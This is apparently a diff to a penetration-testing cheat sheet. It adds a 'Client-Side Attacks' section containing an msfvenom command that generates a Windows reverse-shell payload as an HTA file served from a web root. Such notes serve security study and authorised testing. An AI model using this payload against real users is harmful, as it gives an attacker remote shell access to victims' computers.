@@ -57,6 +57,11 @@ https://pentestmonkey.net/tools/audit/unix-privesc-check
 ```
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 
+## Client-Side Attacks
+### HTA Attack in Action
+```
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o /var/www/html/evil.hta
+```
 
 ## Active Directory
 ### Enumeration
